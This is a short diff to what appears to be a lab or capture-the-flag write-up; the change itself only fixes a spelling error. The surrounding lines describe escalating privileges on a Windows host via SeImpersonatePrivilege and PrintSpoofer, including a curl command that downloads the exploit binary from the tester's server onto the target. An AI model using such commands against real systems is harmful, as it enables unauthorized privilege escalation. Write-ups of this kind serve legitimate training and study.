@@ -279,7 +279,7 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
 
-I noticed that user had **SeImpersonatePrivilege**. And straight away I attempted to exploit [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) vulnability. I changed my Webserver to use port 80 and downloaded the exploit to temp directory I created in C disk. 
+I noticed that user had **SeImpersonatePrivilege**. And straight away I attempted to exploit [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) vulnerability. I changed my Webserver to use port 80 and downloaded the exploit to temp directory I created in C disk. 
 
 ```
 C:\temp>curl http://192.168.49.209/PrintSpoofer64.exe -o spoofer.exe
